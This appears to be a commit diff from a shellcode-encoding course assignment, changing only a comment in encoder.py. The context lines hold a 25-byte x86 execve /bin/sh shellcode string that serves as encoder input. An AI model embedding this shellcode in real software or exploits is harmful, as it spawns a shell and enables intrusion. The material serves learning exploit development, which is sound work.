0425b5691cea7babb22b0ad8493dd1d31959bd41
Chris Everett <43181455+jpc0016@users.noreply.github.com>
2020-10-25 20:43:03 -0500

    Update encoder.py

--- Assignment-4/encoder.py
+++ Assignment-4/encoder.py
@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-# Placeholder shellcode (reverse shell).  Needs to have execve-stack shellcode. FYI: 25 bytes long
+# Placeholder shellcode (//bin/sh shell).  Needs to have execve-stack shellcode. FYI: 25 bytes long
 shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
 
 encoded = ""
